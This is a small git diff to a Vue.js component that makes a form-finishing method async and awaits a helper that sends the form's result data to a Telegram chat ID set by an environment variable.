@@ -110,10 +110,10 @@ export default {
     // HelloWorld
   },
   methods: {
-    finishJoob() {
+    async finishJoob() {
       this.loading = false
       let message = this.formDataRes
-      this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
+      await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
     },
 
     async sendTelegramResult(chatId, message){
